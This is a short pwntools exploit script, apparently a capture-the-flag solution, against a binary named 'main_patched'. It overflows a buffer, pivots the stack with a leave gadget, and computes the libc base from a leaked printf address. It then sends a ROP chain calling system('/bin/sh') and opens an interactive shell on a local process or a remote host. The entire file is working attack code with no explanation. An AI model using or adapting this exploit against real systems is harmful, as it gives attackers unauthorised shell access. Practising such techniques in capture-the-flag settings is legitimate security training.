from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
        if local<2:
                gdb.attach(p,'''
                        b* 0x0000000000401223
                        ''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./main_patched")
libc=ELF("./libc.so.6")
nc="nc azeaze 18"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
        p=remote(host,port)
else:
        p=process([exe.path])

############### helper functions ##############
def send():
        pass

############### main exploit    ###############
leave=0x0000000000401228

p.send(b"a"*0x20+p64(exe.symbols["password"]+0x7c0-8)+p64(leave)[:-1])

p.recvuntil("verify this captcha later :  ")
libc.address=int(p.recvline().strip(),16)-libc.symbols["printf"]
debug()
log.info(hex(libc.address))
rop=ROP(libc)
rdi=rop.find_gadget(["pop rdi","ret"])[0]
binsh=next(libc.search(b"/bin/sh\x00"))
system=libc.symbols["system"]
p.sendline(b"a"*0x7c0+p64(rdi)+p64(binsh)+p64(system))


p.interactive()